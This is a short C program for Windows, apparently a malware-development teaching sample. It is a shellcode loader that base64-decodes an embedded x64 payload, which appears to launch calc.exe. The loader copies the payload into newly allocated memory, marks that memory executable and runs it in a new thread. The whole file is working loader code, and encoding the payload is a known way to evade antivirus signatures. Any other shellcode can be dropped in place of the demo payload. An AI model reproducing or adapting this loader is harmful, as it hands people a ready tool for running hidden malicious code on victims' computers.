#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

#pragma comment (lib, "Crypt32.lib")

unsigned char payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int p_len = sizeof(payload);

int DecodeB64(const BYTE * src, unsigned int srcLen, char *dst, unsigned int dstLen) {
    DWORD outLen;
    BOOL fRet;

    outLen = dstLen;
    fRet = CryptStringToBinary((LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE *)dst, &outLen, NULL, NULL);

    if (!fRet) outLen = 0;

    return (outLen);
}

int main(void) {
    void *e_mem;
    BOOL rv;
    HANDLE th;
    DWORD o_protect = 0;

    e_mem = VirtualAlloc(0, p_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s: 0x%-016p\n", "payload_addr", (void *)payload);
    printf("%-20s: 0x%-016p\n", "exec_mem_addr", (void *)e_mem);

    printf("\nHIT 1st KEY\n");
    getchar();

    // Decode B64
    DecodeB64((const BYTE *)payload, p_len, (char *)e_mem, p_len);

    rv = VirtualProtect(e_mem, p_len, PAGE_EXECUTE_READ, &o_protect);

    printf("\nHIT 2ND KEY\n");
    getchar();

    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) e_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}